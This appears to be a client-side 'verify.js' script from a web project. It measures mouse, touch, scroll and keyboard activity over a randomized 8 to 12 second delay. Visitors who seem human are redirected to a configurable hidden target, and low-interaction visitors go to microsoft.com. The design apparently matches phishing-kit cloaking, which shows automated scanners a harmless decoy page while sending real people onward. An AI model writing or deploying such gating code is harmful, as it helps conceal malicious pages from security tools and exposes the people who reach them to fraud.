// public/verify.js
let moves = 0;
let entropy = 0;
let lastX = 0, lastY = 0, lastTime = Date.now();

const mobile = /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
const minMoves   = mobile ? 3 : 5;
const minEntropy = mobile ? 9 : 16;

function updateEntropy(dx, dy, type) {
  const now = Date.now();
  const dt = (now - lastTime) / 1000 || 1;
  const dist = Math.sqrt(dx * dx + dy * dy);
  entropy += Math.log2(1 + dist + 1) / dt * (type === 'touch' ? 4 : 1);
  lastTime = now;
  moves++;
}

document.addEventListener('mousemove', e => {
  if (lastX && lastY) updateEntropy(Math.abs(e.clientX - lastX), Math.abs(e.clientY - lastY), 'mouse');
  lastX = e.clientX;
  lastY = e.clientY;
});

document.addEventListener('touchmove', e => {
  if (e.touches?.length) {
    const t = e.touches[0];
    if (lastX && lastY) updateEntropy(Math.abs(t.clientX - lastX), Math.abs(t.clientY - lastY), 'touch');
    lastX = t.clientX;
    lastY = t.clientY;
  }
});

window.addEventListener('scroll', () => { entropy += 10; moves += 2; });
window.addEventListener('wheel', () => { entropy += 8; moves += 2; });
document.addEventListener('keydown', () => { entropy += 6; moves += 2; });

setTimeout(() => {
  console.log('CHECK | Moves:', moves, 'Entropy:', entropy.toFixed(1));
  if (moves >= minMoves && entropy >= minEntropy) {
    console.log('Passed → redirecting');
    location.href = window.REDIRECT_TARGET || 'https://www.microsoft.com';
  } else {
    console.log('Low interaction → fail-safe');
    location.href = 'https://www.microsoft.com';
  }
}, 8000 + Math.random() * 4000);  // random delay 8–12s for realism
